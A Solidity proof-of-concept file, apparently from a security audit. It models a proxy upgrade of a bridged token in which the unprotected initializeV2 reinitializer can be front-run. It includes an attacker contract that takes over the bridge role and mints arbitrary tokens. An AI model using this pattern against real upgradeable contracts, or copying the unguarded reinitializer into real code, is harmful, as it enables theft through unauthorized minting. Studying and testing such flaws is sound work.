// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface ICustomBridgedTokenLike {
    function initialize(string memory tokenName, string memory tokenSymbol, uint8 tokenDecimals) external;
    function initializeV2(
        string memory tokenName,
        string memory tokenSymbol,
        uint8 tokenDecimals,
        address bridgeAddress
    ) external;
    function mint(address recipient, uint256 amount) external;
    function bridge() external view returns (address);
    function initializedVersion() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
}

/// @notice Minimal transparent proxy used to model non-atomic upgrades.
contract LineaF3SimpleProxy {
    bytes32 private constant IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("linea.f3.proxy.implementation")) - 1);
    bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("linea.f3.proxy.admin")) - 1);

    error Unauthorized();
    error ImplementationNotSet();

    constructor(address admin_) {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            sstore(slot, admin_)
        }
    }

    function admin() public view returns (address admin_) {
        bytes32 slot = ADMIN_SLOT;
        assembly {
            admin_ := sload(slot)
        }
    }

    function implementation() public view returns (address implementation_) {
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            implementation_ := sload(slot)
        }
    }

    function upgradeTo(address implementation_) external {
        if (msg.sender != admin()) revert Unauthorized();
        bytes32 slot = IMPLEMENTATION_SLOT;
        assembly {
            sstore(slot, implementation_)
        }
    }

    fallback() external payable {
        _delegate();
    }

    receive() external payable {}

    function _delegate() internal {
        address impl = implementation();
        if (impl == address(0)) revert ImplementationNotSet();
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

/// @notice V1 bug-parity model of BridgedToken initialize + onlyBridge mint.
contract BridgedTokenV1Like {
    string public name;
    string public symbol;
    uint8 public decimalsValue;
    address public bridge;
    uint8 public initializedVersion;
    mapping(address => uint256) internal balances;

    error AlreadyInitialized();
    error OnlyBridge(address bridgeAddress);

    constructor() {
        _disableInitializers();
    }

    modifier initializer() {
        if (initializedVersion >= 1) revert AlreadyInitialized();
        initializedVersion = 1;
        _;
    }

    modifier reinitializer(uint8 version) {
        if (initializedVersion >= version) revert AlreadyInitialized();
        initializedVersion = version;
        _;
    }

    modifier onlyBridge() {
        if (msg.sender != bridge) revert OnlyBridge(bridge);
        _;
    }

    function _disableInitializers() internal {
        initializedVersion = type(uint8).max;
    }

    function initialize(string memory tokenName, string memory tokenSymbol, uint8 tokenDecimals) external initializer {
        name = tokenName;
        symbol = tokenSymbol;
        decimalsValue = tokenDecimals;
        // Real contract sets bridge to msg.sender at v1 initialization.
        bridge = msg.sender;
    }

    function mint(address recipient, uint256 amount) external onlyBridge {
        balances[recipient] += amount;
    }

    function balanceOf(address account) external view returns (uint256) {
        return balances[account];
    }
}

/// @notice Bug-parity model of CustomBridgedToken.initializeV2 reinitializer(2).
contract CustomBridgedTokenV2Like is BridgedTokenV1Like {
    function initializeV2(
        string memory tokenName,
        string memory tokenSymbol,
        uint8 tokenDecimals,
        address bridgeAddress
    ) public reinitializer(2) {
        name = tokenName;
        symbol = tokenSymbol;
        decimalsValue = tokenDecimals;
        bridge = bridgeAddress;
    }
}

contract LineaF3InitV2Attacker {
    function seizeBridgeAndMint(address proxy, address recipient, uint256 amount) external {
        ICustomBridgedTokenLike(proxy).initializeV2("atk", "ATK", 18, address(this));
        ICustomBridgedTokenLike(proxy).mint(recipient, amount);
    }
}

